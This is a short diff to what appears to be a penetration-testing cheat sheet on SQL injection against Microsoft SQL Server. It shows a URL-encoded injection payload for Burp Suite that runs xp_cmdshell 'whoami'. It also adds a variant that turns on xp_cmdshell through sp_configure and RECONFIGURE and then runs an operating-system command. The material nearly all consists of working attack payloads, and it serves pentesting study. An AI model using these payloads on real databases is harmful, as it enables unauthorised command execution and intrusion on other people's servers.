@@ -62,6 +62,15 @@ and URL encoded for Burp Suite:
 '%20execute%20xp_cmdshell%20%27whoami%27%3B%20--%20
 ```
 
+Variant: https://stackoverflow.com/questions/5131491/enable-xp-cmdshell-sql-server
+```
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+exec xp_cmdshell whoami
+```
+
 #### In blind mode
 
 Once identified a vulnerable input field (ALWAYS url encoded):
